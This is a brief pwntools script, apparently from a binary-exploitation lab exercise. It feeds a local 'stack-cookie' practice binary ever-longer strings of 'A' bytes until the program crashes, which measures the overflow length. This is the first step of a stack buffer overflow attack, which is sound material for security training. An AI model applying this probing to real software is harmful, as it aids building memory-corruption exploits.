import struct

from pwn import *
from pwn import asm, context, gdb, p8, p16, p32, process

context.terminal = ["tmux", "splitw", "-h"]
context.log_level = "DEBUG"
p = process(["./20-stack-cookie"])
i = 1
while True:
    p.recvline()  # you have XX trials left
    p.recvline()  # how many bytes?

    p.sendline(f"{i}".encode())

    p.recvline()  # reading X bytes

    p.sendline(b"A" * i)

    p.recvline()  # Hello YYYY!
    rec = p.recvline()  # Exit Status 0

    if rec != b"Exit status: 0\n":
        print(rec)
        print(f"When processing {i} bytes stack crashed")
        exit(1)
    print(f"Success processed {i} bytes to the stack")
    i += 1

p.close()
